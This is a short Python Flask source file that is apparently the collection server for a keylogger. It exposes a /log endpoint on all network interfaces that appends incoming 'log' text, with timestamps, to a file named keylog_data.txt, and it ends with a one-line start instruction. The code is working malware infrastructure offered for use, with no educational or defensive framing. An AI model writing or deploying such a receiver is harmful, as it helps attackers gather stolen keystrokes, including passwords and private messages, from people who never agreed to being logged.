from flask import Flask, request, jsonify
from datetime import datetime
import os

app = Flask(__name__)
LOG_DIR = "logs"
LOG_FILE = os.path.join(LOG_DIR, "keylog_data.txt")

@app.route("/log", methods=["POST"])
def log_data():
    try:
        content = request.get_json()
        if not content or "log" not in content:
            return jsonify({"error": "Missing 'log' key in request body"}), 400

        log_text = content["log"]
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_entry = f"[{timestamp}] {log_text}\n"

        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write(log_entry)

        return jsonify({"message": "Log saved"}), 200

    except Exception as e:
        return jsonify({"error": str(e)}), 500

if __name__ == "__main__":
    os.makedirs(LOG_DIR, exist_ok=True)
    app.run(host="0.0.0.0", port=5000)

## to start the server  python log_server.py